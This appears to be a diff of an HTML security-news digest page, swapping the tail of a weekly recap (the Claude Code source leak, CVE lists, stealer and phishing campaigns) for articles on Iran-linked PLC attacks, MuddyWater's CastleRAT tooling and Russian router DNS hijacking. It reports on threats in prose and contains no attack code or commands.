Leaks](https://thehackernews.com/2026/04/claude-code-tleaked-via-npm-packaging.html)—Anthropic acknowledged that internal code for its popular artificial intelligence (AI) coding assistant, Claude Code, had been inadvertently released due to a human error. Essentially, what happened was this: When Anthropic pushed out version 2.1.88 of its Claude Code npm package, it accidentally included a map file that exposed nearly 2,000 source code files and more than 512,000 lines of code. The[source code leak](https://github.com/zackautocracy/claude-code)has since[revealed](https://ccleaks.com/)various features the company appears to be working on or that are built into the service, including an Undercover mode to hide AI authorship from contributions to public code repositories, a persistent background agent called KAIROS, combat distillation attacks, and[active monitoring](https://alex000kim.com/posts/2026-03-31-claude-code-source-leak/#frustration-detection-via-regex-yes-regex)of words and phrases that show signs of user frustration. The leak also quickly escalated into a cybersecurity threat, as attackers pounced on the surge in interest to lure developers into downloading stealer malware.
-🔥 Trending CVEs
-New vulnerabilities show up every week, and the window between disclosure and exploitation keeps getting shorter. The flaws below are this week's most critical — high-severity, widely used software, or already drawing attention from the security community.
-Check these first, patch what applies, and don't wait on the ones marked urgent — [CVE-2026-35616](https://thehackernews.com/2026/04/fortinet-patches-actively-exploited-cve.html) (Fortinet FortiClient EMS), [CVE-2026-20093](https://thehackernews.com/2026/04/cisco-patches-98-cvss-imc-and-ssm-flaws.html) (Cisco Integrated Management Controller), [CVE-2026-20160](https://thehackernews.com/2026/04/cisco-patches-98-cvss-imc-and-ssm-flaws.html) (Cisco Smart Software Manager On-Prem), [CVE-2026-5281](https://thehackernews.com/2026/04/new-chrome-zero-day-cve-2026-5281-under.html) (Google Chrome), [CVE-2026-3502](https://thehackernews.com/2026/03/trueconf-zero-day-exploited-in-attacks.html) (TrueConf), [CVE-2026-27876, CVE-2026-27880](https://grafana.com/blog/grafana-security-release-critical-and-high-severity-security-fixes-for-cve-2026-27876-and-cve-2026-27880/) (Grafana), [CVE-2026-4789](https://kb.cert.org/vuls/id/655822) (Kyverno), [CVE-2026-2275, CVE-2026-2285, CVE-2026-2286, CVE-2026-2287](https://kb.cert.org/vuls/id/221883) (CrewAI), [CVE-2025-14819](https://notepad-plus-plus.org/news/v893-released/) (Notepad++), [CVE-2026-34714](https://github.com/vim/vim/security/advisories/GHSA-2gmj-rpqf-pxvh), [CVE-2026-34982](https://github.com/vim/vim/security/advisories/GHSA-8h6p-m6gr-mpw9) ([Vim](https://blog.calif.io/p/mad-bugs-vim-vs-emacs-vs-claude)), [CVE-2026-33660](https://github.com/n8n-io/n8n/security/advisories/GHSA-58qr-rcgv-642v), [CVE-2026-33696](https://github.com/n8n-io/n8n/security/advisories/GHSA-mxrg-77hm-89hv) (n8n), [CVE-2026-25639](https://github.com/axios/axios/security/advisories/GHSA-43fc-jf86-j433) (Axios), [CVE-2026-25075](https://www.strongswan.org/blog/2026/03/23/strongswan-vulnerability-(cve-2026-25075).html) ([strongSwan](https://bishopfox.com/blog/strongswan-cve-2026-25075-integer-underflow-in-vpn-authentication)), [CVE-2026-34156](https://github.com/nocobase/nocobase/security/advisories/GHSA-px3p-vgh9-m57c) (NocoBase), [CVE-2026-3308](https://kb.cert.org/vuls/id/951662) (Artifex MuPDF), [CVE-2026-1579](https://www.cisa.gov/news-events/ics-advisories/icsa-26-090-02) (PX4 Autopilot), [CVE-2026-3991](https://labs.infoguard.ch/advisories/cve-2026-3991_symantec-dlp-agent_local-privilege-escalation/) (Symantec Data Loss Prevention Agent for Windows), [CVE-2026-33026](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-fhh2-gg7w-gwpq) (nginx-ui), [CVE-2026-33416](https://github.com/pnggroup/libpng/security/advisories/GHSA-m4pc-p4q3-4c7j), [CVE-2026-33636](https://github.com/pnggroup/libpng/security/advisories/GHSA-wjr5-c57x-95m2) (libpng), [CVE-2026-3775, CVE-2026-3779](https://www.foxit.com/support/security-bulletins.html) (Foxit PDF Editor), [CVE-2026-34980, CVE-2026-34990](https://heyitsas.im/posts/cups/) (CUPS), and [CVE-2026-34121](https://www.tp-link.com/us/support/faq/5047/) (TP-Link).
-🎥 Cybersecurity Webinars
-[Learn How to Close Identity Gaps Using Insights from IT Leaders](https://thehacker.news/identity-maturity-2026?source=recap)→ Identity programs face rising risk from disconnected apps, manual credentials, and expanding AI access. Based on 2026 insights from 600+ IT and security leaders, this session shows what to measure, fix, and do now to close identity gaps and regain control.[Learn How to Build Secure AI Agents Using Identity, Visibility, and Control](https://thehacker.news/ghost-in-the-machine?source=recap)→ AI agents are already being used, but most teams don’t know how to secure them properly. This session shows a clear, practical way to do it using three key ideas: identity, visibility, and control.You will see what real deployment looks like, how to track what agents do, and how to manage their behavior safely.It also explains how to secure AI systems today without waiting for standards to settle.
-📰 Around the Cyber World
-- Device Code Phishing Attacks Surge —
-[Device code phishing attacks](https://thehackernews.com/2026/03/device-code-phishing-hits-340-microsoft.html), which abuse the OAuth device authorization grant flow to hijack accounts, have surged more than 37.5x this year. Push Security said it detected a 15x increase in device code phishing pages at the start of March 2026, indicating that the technique has finally entered mainstream adoption. "The technique tricks a user into issuing access tokens for an attacker-controlled application (not a device, confusingly)," the company[said](https://pushsecurity.com/blog/device-code-phishing/). "Any app that supports device code logins can be a target. Popular examples include Microsoft, Google, Salesforce, GitHub, and AWS. That said, Microsoft is, as always, much more heavily targeted at scale now than any other app." This has been fueled by the emergence of EvilTokens (aka ANTIBOT), the first reported criminal PhaaS (Phishing-as-a-Service) toolkit that supports device code pushing. EvilTokens features a Cloudflare Workers frontend and a Railway backend for authentication. Early iterations of the PhaaS kit emerged in January 2026. Another closed-source PhaaS kit called Venom offers device code phishing capabilities similar to EvilTokens. Some of the other PhaaS kits that have incorporated this technique include SHAREFILE, CLURE, LINKID, AUTHOV, DOCUPOLL, FLOW_TOKEN, PAPRIKA, DCSTATUS, and DOLCE. - LinkedIn Comes Under Scanner for BrowserGate —A newly published report called BrowserGate alleged that Microsoft's LinkedIn is using hidden JavaScript scripts on its website to scan visitors' browsers for thousands of installed Google Chrome extensions and collect device data without users' consent. "LinkedIn scans for over 200 products that directly compete with its own sales tools, including Apollo, Lusha, and ZoomInfo," the report
-[said](https://browsergate.eu/). "Because LinkedIn knows each user’s employer, it can map which companies use which competitor products. It is extracting the customer lists of thousands of software companies from their users' browsers without anyone's knowledge. Then it uses what it finds. LinkedIn has already sent enforcement threats to users of third-party tools, using data obtained through this covert scanning to identify its targets." The report also claimed LinkedIn loads an invisible tracking pixel from HUMAN Security, along with a separate fingerprinting script that runs from LinkedIn's servers and a third script from Google that runs silently on every page load. In response to the findings, LinkedIn[told](https://www.bleepingcomputer.com/news/security/linkedin-secretely-scans-for-6-000-plus-chrome-extensions-collects-data/)Bleeping Computer it scans for certain extensions that scrape data without members' consent in violation of its terms of service. The company also claimed the report is from an individual who is "subject to an account restriction for scraping and other violations of LinkedIn's Terms of Service." - ICE Confirms Use of Paragon Spyware —The U.S. Immigration and Customs Enforcement (ICE)
-[confirmed](https://cyberscoop.com/ice-using-paragon-spyware-house-democrats-letter/)it uses spyware developed by Paragon to "identify, disrupt, and dismantle Foreign Terrorist Organizations, addressing the escalating fentanyl epidemic and safeguarding national security." Paragon's Graphite spyware has been found on the phones of journalists. WhatsApp last year[said](https://thehackernews.com/2026/04/whatsapp-alerts-200-users-after-fake.html)it disrupted a campaign that deployed the spyware against its users. The governments of Australia, Canada, Cyprus, Denmark, Israel, and Singapore are[suspected](https://thehackernews.com/2025/03/six-governments-likely-use-israeli.html)to be customers of the Israeli company. - Ex-Engineer Pleads Guilty to Extortion Campaign —Daniel Rhyne, 59, of Kansas City, Missouri,
-[pleaded guilty](https://www.justice.gov/usao-nj/pr/former-employee-national-industrial-company-pleads-guilty-crimes-related-hacking)to a failed data extortion campaign that targeted his former employer. Rhyne was[arrested](https://thehackernews.com/2024/09/ex-engineer-charged-in-missouri-for.html)in September 2024. According to court documents, Rhyne worked as a core infrastructure engineer at a U.S.-based industrial company headquartered in New Jersey. In November 2023, the defendant executed a ransomware attack against the company and sent an extortion email to its employees, threatening to continue shutting down the firm's servers unless he was paid about 20 Bitcoin, which was valued at $750,000 at the time. Last month, the U.S. Justice Department (DoJ) announced the conviction of Cameron Curry (aka Loot), a 27-year-old from Charlotte, North Carolina, for carrying out a cyber extortion scheme against a D.C.-based international technology company called Brightly Software. "Trial evidence established that Curry misused his position to access the victim company's personnel and other sensitive corporate records, which he then used to carry out the cyber extortion scheme after he learned that his contract was not going to be renewed and that he would no longer be employed by the company," the DoJ[said](https://www.justice.gov/usao-dc/pr/north-carolina-man-convicted-cyber-extortion-scheme-targeted-dc-based-tech-company). Between December 11, 2023, and January 24, 2024, Curry sent more than 60 emails to company executives and employees, stating he would disclose sensitive information unless he was paid $2.5 million in cryptocurrency. Brightly ended up paying $7,540 in Bitcoin. - Residential Proxies Bypass Reputation Systems —Threat intelligence firm GreyNoise's analysis of 4 billion sessions targeting the edge over a 90-day period from November 29, 2025, to February 27, 2026, found that 39% of unique IP addresses targeting the edge originated from home internet connections, and that 78% vanish before any reputation system can flag them. "78% of residential IPs appear in only 1–2 sessions and are never observed again," it
-[said](https://www.greynoise.io/blog/invisible-army-why-ip-reputation-fails-against-rotation-economy). "IP reputation is structurally broken against residential proxies. The rotation rate exceeds the update cycle of any feed-based defense." This behavior also makes source IPs indistinguishable from a legitimate user's connection. The data also showed that 0.1% of residential sessions carry exploitation payloads, in contrast to 1.0% from hosting infrastructure, indicating that they are primarily used for network scanning and reconnaissance. The residential proxy traffic is generated by IoT botnets and infected computers, with the networks also resilient against takedown efforts. "After IPIDEA lost 40% of its nodes, operators backfilled within weeks," GreyNoise said. "Every major takedown produces the same result -- temporary disruption, then regeneration." The company also recommended that "Detection must shift from 'where is the traffic from?' to 'what is the traffic doing?" Device fingerprinting provides more durable detection because fingerprints survive IP rotation." - Suspected N. Korea Campaign Targets Cryptocurrency Companies Using React2Shell —A new campaign has been observed systematically compromising cryptocurrency organizations by exploiting web application vulnerabilities such as
-[React2Shell](https://thehackernews.com/2025/12/north-korea-linked-actors-exploit.html)(CVE-2025-55182), pillaging AWS tenants with valid credentials, and exfiltrating proprietary exchange software containing hardcoded secrets. "Their targeting spans the crypto supply chain, from staking platforms, to exchange software providers, to the exchanges themselves," Ctrl-Alt-Intel[said](https://ctrlaltintel.com/research/DPRK-Crypto-Heist/). The threat intelligence firm has assessed the activity with moderate confidence to be aligned with North Korean cryptocurrency theft operations. - India Extends SIM-Binding Mandate —The Indian government has extended its
-[SIM-binding mandate](https://thehackernews.com/2025/12/india-orders-messaging-apps-to-work.html)through December 31, 2026, while shelving plans to require messaging apps to forcibly log out web-based sessions like WhatsApp Web every six hours. The decision[comes](https://www.thehindu.com/sci-tech/technology/government-shelves-periodic-web-logout-for-chat-apps-extends-sim-binding-to-december-31/article70811929.ece)after the Broadband India Forum, which represents Meta and Google, warned the Department of Telecommunications (DoT) that the directions were unconstitutional. Under the framework announced in November 2025, a messaging app account would be tied exclusively to the physical SIM card during registration. This meant that the users could access the messages and other content only when that SIM is present in the device. Companies were given 90 days (i.e., until the end of February 2026) to comply. While SIM binding has been proposed as a way to combat spammers and conduct cross‑border fraud, the move has raised feasibility and user experience concerns. According to Moneycontrol, WhatsApp is[said](https://www.moneycontrol.com/news/business/dot-extends-sim-binding-deadline-for-whatsapp-telegram-signal-to-year-end-13876716.html)to be beta testing SIM binding on Android. - Russian Threat Actors Looking to Regain Access Through Compromised Infrastructure —Russian threat actors like APT28 and Void Blizzard are attempting to regain access to computer systems they previously compromised to check if access is still available and whether the obtained credentials remain valid, CERT-UA has warned. "Unfortunately, these attempts sometimes succeed if the root cause of the initial incident has not been completely eliminated," the agency
-[said](https://cip.gov.ua/ua/statics/analitichni-materiali-derzhspeczv-yazku). - OkCupid Settles with FTC for Privacy Violations —OkCupid and its owner, Match Group,
-[reached](https://www.ftc.gov/news-events/news/press-releases/2026/03/ftc-takes-action-against-match-okcupid-deceiving-users-sharing-personal-data-third-party)a settlement with the U.S. Federal Trade Commission over allegations that it did not inform its customers that nearly three million user photos were shared with Clarifai, a company that develops AI systems to identify and analyze images and videos. The complaint also accused the dating site of sharing users' location information and other details without their consent. As part of the settlement, OkCupid and Match did not admit or deny the allegations but agreed to a permanent prohibition that prevents them from misrepresenting how they use and share personal data. - New Android Malware Mirax Advertised —A sophisticated new Android banking trojan named
-[Mirax](https://x.com/KrakenLabs_Team/status/2029525839860163010)is being advertised as a private malware-as-a-service (MaaS) offering for up to $2,500 per month. The malware enables customers to gain remote control over devices and includes specialized overlays for more than 700 different financial applications to steal credentials and other sensitive information. It can also capture keystrokes, intercept SMS messages, record lock screen patterns, and use the infected device as a SOCKS5 proxy. - Venom Stealer Spreads via ClickFix —A new malware-as-a-service (MaaS) platform dubbed
-[Venom Stealer](https://www.blackfog.com/venom-stealer-turns-clickfix-into-a-full-exfiltration-pipeline/)is being sold on cybercrime forums as a subscription ($250/month to $1,800 for lifetime access). It's marketed as "the Apex Predator of Wallet Extraction." Unlike other stealers, it automates credential theft and enables continuous data exfiltration. "It builds[ClickFix](https://thehackernews.com/2026/02/microsoft-discloses-dns-based-clickfix.html)social engineering directly into the operator panel, automates every step after initial access, and creates a continuous exfiltration pipeline that does not end when the initial payload finishes running," BlackFog said. The development coincides with a new[ClickFix variant](https://www.cyberproof.com/blog/the-clickfix-evolution-new-variant-replaces-powershell-with-rundll32-and-webdav/)that replaces PowerShell with a "rundll32.exe" command to download a DLL from an attacker-controlled WebDAV resource. The attack leads to the execution of a secondary loader called SkimokKeep, which then downloads additional payloads, while incorporating anti-sandboxing and anti-debugging mechanisms. In the meantime,[recent ClickFix campaigns](https://mp.weixin.qq.com/s/0M1sZq1HqwAAaMbRDBEZEw)have also leveraged searches for installation tutorials for OpenClaw, Claude, and other AI tools, as well as for common macOS issues to push stealer malware like[MacSync](https://thehackernews.com/2026/03/clickfix-campaigns-spread-macsync-macos.html). - More Information Stealers Spotted —Speaking of stealers, recent campaigns have also been observed using procurement-themed email lures and fake Homebrew install guides served via sponsored search results to deliver
-[Phantom Stealer](https://www.group-ib.com/blog/phantom-stealer-credential-theft/)and[SHub Stealer](https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-03-31-SHub-Stealer-Activity.txt). Some other newly discovered infostealer malware families include[Storm](https://www.varonis.com/blog/storm-infostealer),[MioLab](https://www.levelblue.com/blogs/spiderlabs-blog/say-my-name-how-miolab-is-building-macos-stealer-empire), and[Torg Grabber](https://www.gendigital.com/blog/insights/research/torg-grabber-credential-stealer-analysis). In a related development, CyberProof[said](https://www.cyberproof.com/blog/a-deep-dive-into-pxa-stealer/)it observed a surge in[PXA Stealer](https://thehackernews.com/2026/02/microsoft-warns-python-infostealers.html)activity targeting global financial institutions during Q1 2026. Another malware that has[gained notoriety](https://www.splunk.com/en_us/blog/security/blankgrabber-trojan-stealer-analysis-detection.html)is BlankGrabber, which is distributed through social engineering and phishing campaigns. Data gathered by Flare[shows](https://flare.io/learn/resources/blog/victim-profiling-stealer-malware)that a single stealer log can be devastating, with individual logs containing up to 1,381 pieces of personally identifiable information. In an analysis published by Whiteintel last month, the company found that a single careless download of cracked software by one employee can hand criminal groups direct access to an entire corporate network in under two days. "An employee downloads cracked software on Tuesday afternoon," it[said](https://whiteintel.io/blog/infostealer-lifecycle-48-hours). "By Thursday morning, their credentials are listed on the Russian Market for $15. Corporate VPN access, AWS credentials, session tokens that bypass MFA – all packaged and ready for purchase." - Phishing Campaign Targets Philippine Banking Users —An ongoing phishing campaign targeting major banks in the Philippines is using email phishing via compromised accounts as the initial vector to harvest online banking credentials and one-time passwords (OTPs) for financial fraud. According to Group-IB, the campaign began in early 2024, distributing over 900 malicious links as part of the coordinated scheme. Clicking on the link embedded in the email message triggers a redirection chain that uses trusted services like Google Business, AMP CDN, Cloudflare Workers, and URL shorteners before taking the victims to the final landing page. "The campaign enables real-time financial fraud by bypassing MFA mechanisms through the theft of valid One-Time Passwords (OTP), allowing attackers to perform unauthorized fund transfers," the company
-[said](https://www.group-ib.com/blog/phisles-phishing-banks-philippines/). "Telegram bots were used as exfiltration channels, enabling threat actors to automatically collect victims' login information in real time." The activity has been attributed to a threat group called PHISLES. - Chrome Extensions Harvests ChatGPT Conversations —A malicious Chrome extension, named "ChatGPT Ad Blocker" (ID: ipmmidjikiklckbngllogmggoofbhjikgb), found on the Chrome Web Store masquerades as an ad-blocking tool for the AI chatbot, but contains functionality to "steal the user's ChatGPT conversations data by systematically copying the HTML page and sending to it to a webhook on a private Discord channel," DomainTools
-[said](https://dti.domaintools.com/securitysnacks/securitysnack-openai-anti-ads-malware). - Iran Conflict Triggers Espionage Activity in Middle East —In the aftermath of the U.S.-Israel-Iran conflict, Proofpoint
-[said](https://www.proofpoint.com/us/blog/threat-insight/iran-conflict-drives-heightened-espionage-activity-against-middle-east-targets)it has recorded an increase in campaigns from state-sponsored threat actors likely affiliated with China (UNK_InnerAmbush, which uses phishing emails to deliver[Cobalt Strike](https://www.pointwild.com/threat-intelligence/cobalt-strike-overview)payload), Belarus ([TA473](https://thehackernews.com/2023/03/winter-vivern-apt-targets-european.html), which has used HTML attachments in emails for reconnaissance), Pakistan (UNK_RobotDreams, which has sent spear-phishing emails to India-based offices of Middle East government entities to deliver a[Rust backdoor](https://thehackernews.com/2026/03/transparent-tribe-uses-ai-to-mass.html)), and Hamas ([TA402](https://thehackernews.com/2023/11/new-campaign-targets-middle-east.html), which has used compromised Iraq government email addresses to conduct Microsoft account credential harvesting) targeting Middle East government organizations. The enterprise security company said it also identified the Charming Kitten actor targeting a think tank in the U.S. to trick recipients into entering their Microsoft account credentials. One activity cluster that remains unattributed is UNK_NightOwl. The email messages include a domain that spoofed Microsoft OneDrive, leading the victim to a credential harvesting page. If the user enters credentials and clicks the sign-in button, the target is redirected to "hxxps://iran.liveuamap[.]com/," a legitimate open-source platform called Liveuamap with news updates on the Middle East conflict. - U.K. Warns of Messaging App Targeting —The U.K. National Cyber Security Centre (NCSC) became the latest cybersecurity agency to warn of
-[malicious activity](https://www.ncsc.gov.uk/news/ncsc-warns-of-messaging-app-targeting)from messaging apps like WhatsApp, Messenger, and Signal, where threat actors could trick high-risk individuals into[sharing their login or account recovery codes](https://thehackernews.com/2026/03/fbi-warns-russian-hackers-target-signal.html), or linking an attacker-controlled device under their accounts.
-🔧 Cybersecurity Tools
-[Dev Machine Guard](https://github.com/step-security/dev-machine-guard)→ It is an open-source script that scans a developer machine to list installed tools and detect security risks across IDEs, AI agents, extensions, and configurations, without accessing source code or secrets, helping expose gaps traditional tools miss in developer environments.[Pius](https://github.com/praetorian-inc/pius)→ It is an open-source tool that maps a company’s external attack surface by discovering and cataloging internet-facing assets, helping security teams identify exposure and reconnaissance risks that could be targeted by attackers.
-Disclaimer: For research and educational use only. Not security-audited. Review all code before use, test in isolated environments, and ensure compliance with applicable laws.
-Conclusion
-The lesson is simple. Small things matter. Most issues now start from normal parts of the system, not big, obvious gaps.
-Don’t trust anything just because it looks routine. Updates, tools, and background systems can all be used in the wrong way. If it seems low risk, check it again. That’s where the problems are starting now.
+            <h2 class="article-title">Iran-Linked Hackers Disrupt U.S. Critical Infrastructure by Targeting Internet-Exposed PLCs</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/iran-linked-hackers-disrupt-us-critical.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Iran-affiliated cyber actors are targeting internet-facing operational technology (OT) devices across critical infrastructures in the U.S., including programmable logic controllers (PLCs), cybersecurity and intelligence agencies [warned](https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-097a) Tuesday.
+"These attacks have led to diminished PLC functionality, manipulation of display data and, in some cases, operational disruption and financial loss," the U.S. Federal Bureau of Investigation (FBI) [said](https://x.com/FBICyberDiv/status/2041566548691660897) in a post on X.
+The agencies said the [campaign](https://thehackernews.com/2025/06/us-agencies-warn-of-rising-iranian.html) is part of a [recent escalation](https://thehackernews.com/2026/03/iran-linked-hackers-breach-fbi.html) in cyber attacks orchestrated by Iranian hacking groups against U.S. organizations in response to the ongoing conflict between Iran, and the U.S. and Israel.
+Specifically, the activity has led to PLC disruptions across several U.S. critical infrastructure sectors via what the authoring agencies described as malicious interactions with the project file and manipulation of data on human-machine interface (HMI) and supervisory control and data acquisition (SCADA) displays.
+These attacks have singled out Rockwell Automation and Allen-Bradley PLCs deployed in government services and facilities, Water and Wastewater Systems (WWS), and energy sectors.
+"The actors used leased, third-party hosted infrastructure with configuration software, such as Rockwell Automation's Studio 5000 Logix Designer software, to create an accepted connection to the victim's PLC," the advisory said. "Targeted devices include CompactLogix and Micro850 PLC devices."
+Upon obtaining initial access, the threat actors established command-and-control by deploying Dropbear, a Secure Shell (SSH) software, on victim endpoints to enable remote access through port 22 and facilitate the extraction of the device's project file and data manipulation on HMI and SCADA displays.
+To combat the threat, organizations are advised to avoid exposing the PLC to the internet, take steps to prevent remote modification either via a physical or software switch, implement multi-factor authentication (MFA), and erect a firewall or network proxy in front of the PLC to control network access, keep PLC devices up-to-date, disable any unused authentication features, and monitor for unusual traffic.
+This is not the first time Iranian threat actors have targeted OT networks and PLCs. In late 2023, Cyber Av3ngers (aka Hydro Kitten, Shahid Kaveh Group, and UNC5691) was [linked](https://thehackernews.com/2023/11/iranian-hackers-exploit-plcs-in-attack.html) to the active exploitation of Unitronics PLCs to target the Municipal Water Authority of Aliquippa in western Pennsylvania. These attacks compromised at least 75 devices.
+"This advisory confirms what we've observed for months: Iran's cyber escalation follows a known playbook. Iranian threat actors are now moving faster and broader and targeting both IT and OT infrastructure," Sergey Shykevich, threat intelligence group manager at Check Point Research, said in a statement shared with The Hacker News.
+"We documented identical targeting patterns against Israeli PLCs in March. It is not the first time Iranian actors are targeting operational technology in the US for disruption purposes, so organizations shouldn't treat this as a new threat, but as an accelerating one."
+The development comes amid a [new-found surge](https://thehackernews.com/2026/03/iran-linked-hackers-breach-fbi.html) in distributed denial-of-service (DDoS) attacks and claims of hack-and-leak operations carried out by cyber proxy groups and hacktivists targeting Western and Israeli entities, according to Flashpoint.
+In a report published this week, DomainTools Investigations (DTI) described activity attributed to Homeland Justice, Karma/KarmaBelow80, and Handala Hack as a "single, coordinated cyber influence ecosystem" aligned with Iran's Ministry of Intelligence and Security (MOIS) rather than a set of distinct hacktivist groups.
+"These personas function as interchangeable operational veneers applied to a consistent underlying capability," DTI [said](https://dti.domaintools.com/research/handala-mois-linked-cyber-influence-ecosystem-threat-intelligence-assessment). "Their purpose is not to reflect organizational separation, but to enable segmentation of messaging, targeting, and attribution while preserving continuity of infrastructure and tradecraft."
+Public-facing domains and Telegram channels serve as the primary dissemination and amplification hub, with the messaging platform also playing a huge role in command-and-control (C2) operations by allowing the malware to communicate with threat actor-controlled bots, reduce infrastructure overhead, and blend in with normal operations.
+"This ecosystem represents a state-directed instrument of cyber-enabled influence, in which technical operations are tightly integrated with narrative manipulation and media amplification dynamics to achieve coercive and strategic effects," DTI added.
+MuddyWater aș a CastleRAT Affiliate
+The development comes as JUMPSEC [detailed](https://www.jumpsec.com/guides/chainshell-muddywater-russian-criminal-infrastructure/) MuddyWater's ties with the criminal ecosystem, stating that the Iranian state-sponsored threat actor operates at least two CastleRAT builds against Israeli targets. It's worth noting that CastleRAT is a remote access trojan that's part of the [CastleLoader framework](https://thehackernews.com/2025/12/four-threat-clusters-using-castleloader.html) attributed by Recorded Future to a group it tracks under the moniker GrayBravo (aka TAG-150).
+Central to the operations is a PowerShell deployer ("reset.ps1") that deploys a previously undocumented JavaScript-based malware called ChainShell, which then contacts a smart contract on the Ethereum blockchain to retrieve a C2 address and use it to fetch next-stage JavaScript code for execution on compromised hosts.
+Some aspects of these connections between MOIS and the cybercrime ecosystem were also flagged by [Ctrl-Alt-Intel](https://thehackernews.com/2026/03/weekly-recap-qualcomm-0-day-ios-exploit.html#:~:text=MuddyWater%20Evolves%20Its%20Tactics), [Broadcom](https://thehackernews.com/2026/03/iran-linked-muddywater-hackers-target.html), and [Check Point](https://thehackernews.com/2026/03/iran-linked-hackers-breach-fbi.html), highlighting the growing engagement as evidence of a growing reliance on off-the-shelf tools to support state objectives and complicate attribution efforts.
+The same PowerShell loader has also been found to deliver a botnet malware referred to as Tsundere (aka Dindoor). According to JUMPSEC, both ChainShell and Tsundere are separate TAG-150 platform components that are deployed along with CastleRAT.
+"The adoption of a Russian criminal MaaS by an Iranian state actor has direct implications for defenders," JUMPSEC said in a report shared with The Hacker News. "Organizations targeted by MuddyWater, especially in the defence, aerospace, energy, and government sectors, now face threats that combine state-level targeting with commercially developed offensive tools."
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">US warns of Iranian hackers targeting critical infrastructure</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/us-warns-of-iranian-hackers-targeting-critical-infrastructure/" target="_blank">Original Link</a></p>
+            <div class="content-text">Iranian-linked hackers are targeting Internet-exposed Rockwell/Allen-Bradley programmable logic controllers (PLCs) on the networks of U.S. critical infrastructure organizations. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
         <div id="art-2" class="article-body">
+            <h2 class="article-title">Russia Hacked Routers to Steal Microsoft Office Tokens</h2>
+            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/russia-hacked-routers-to-steal-microsoft-office-tokens/" target="_blank">Original Link</a></p>
+            <div class="content-text">Hackers linked to Russia’s military intelligence units are using known flaws in older Internet routers to mass harvest authentication tokens from Microsoft Office users, security experts warned today. The spying campaign allowed state-backed Russian hackers to quietly siphon authentication tokens from users on more than 18,000 networks without deploying any malicious software or code.
+Microsoft said in [a blog post](https://www.microsoft.com/en-us/security/blog/2026/04/07/soho-router-compromise-leads-to-dns-hijacking-and-adversary-in-the-middle-attacks/) today it identified more than 200 organizations and 5,000 consumer devices that were caught up in a stealthy but remarkably simple spying network built by a Russia-backed threat actor known as “Forest Blizzard.”
+Also known as [APT28](https://attack.mitre.org/groups/G0007/) and Fancy Bear, Forest Blizzard is attributed to the military intelligence units within Russia’s General Staff Main Intelligence Directorate (GRU). APT 28 famously compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election.
+Researchers at Black Lotus Labs, a security division of the Internet backbone provider Lumen, found that at the peak of its activity in December 2025, Forest Blizzard’s surveillance dragnet ensnared more than 18,000 Internet routers that were mostly unsupported, end-of-life routers, or else far behind on security updates. A [new report](https://www.lumen.com/blog-and-news/en-us/frostarmada-forest-blizzard-dns-hijacking) from Lumen says the hackers primarily targeted government agencies—including ministries of foreign affairs, law enforcement, and third-party email providers.
+Black Lotus Security Engineer Ryan English said the GRU hackers did not need to install malware on the targeted routers, which were mainly older Mikrotik and TP-Link devices marketed to the Small Office/Home Office (SOHO) market. Instead, they used known vulnerabilities to modify the Domain Name System (DNS) settings of the routers to include DNS servers controlled by the hackers.
+As the U.K.’s National Cyber Security Centre (NCSC) notes in [a new advisory](https://www.ncsc.gov.uk/news/apt28-exploit-routers-to-enable-dns-hijacking-operations) detailing how Russian cyber actors have been compromising routers, DNS is what allows individuals to reach websites by typing familiar addresses, instead of associated IP addresses. In a DNS hijacking attack, bad actors interfere with this process to covertly send users to malicious websites designed to steal login details or other sensitive information.
+English said the routers attacked by Forest Blizzard were reconfigured to use DNS servers that pointed to a handful of virtual private servers controlled by the attackers. Importantly, the attackers could then propagate their malicious DNS settings to all users on the local network, and from that point forward intercept any [OAuth authentication tokens](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-auth-code-flow) transmitted by those users.
+Because those tokens are typically transmitted only after the user has successfully logged in and gone through multi-factor authentication, the attackers could gain direct access to victim accounts without ever having to phish each user’s credentials and/or one-time codes.
+“Everyone is looking for some sophisticated malware to drop something on your mobile devices or something,” English said. “These guys didn’t use malware. They did this in an old-school, graybeard way that isn’t really sexy but it gets the job done.”
+Microsoft refers to the Forest Blizzard activity as using DNS hijacking “to support post-compromise adversary-in-the-middle (AiTM) attacks on Transport Layer Security (TLS) connections against Microsoft Outlook on the web domains.” The software giant said while targeting SOHO devices isn’t a new tactic, this is the first time Microsoft has seen Forest Blizzard using “DNS hijacking at scale to support AiTM of TLS connections after exploiting edge devices.”
+Black Lotus Labs engineer Danny Adamitis said it will be interesting to see how Forest Blizzard reacts to today’s flurry of attention to their espionage operation, noting that the group immediately switched up its tactics in response to [a similar NCSC report](https://www.ncsc.gov.uk/sites/default/files/documents/ncsc-mar-authentic_antics.pdf) (PDF) in August 2025. At the time, Forest Blizzard was using malware to control a far more targeted and smaller group of compromised routers. But Adamitis said the day after the NCSC report, the group quickly ditched the malware approach in favor of mass-altering the DNS settings on thousands of vulnerable routers.
+“Before the last NCSC report came out they used this capability in very limited instances,” Adamitis told KrebsOnSecurity. “After the report was released they implemented the capability in a more systemic fashion and used it to target everything that was vulnerable.”
+TP-Link was among the router makers facing a complete ban in the United States. But on March 23, the U.S. Federal Communications Commission (FCC) took a much broader approach, [announcing](https://www.fcc.gov/document/fcc-updates-covered-list-include-foreign-made-consumer-routers) it would no longer certify consumer-grade Internet routers that are produced outside of the United States.
+The FCC warned that foreign-made routers had become an untenable national security threat, and that poorly-secured routers present “a severe cybersecurity risk that could be leveraged to immediately and severely disrupt U.S. critical infrastructure and directly harm U.S. persons.”
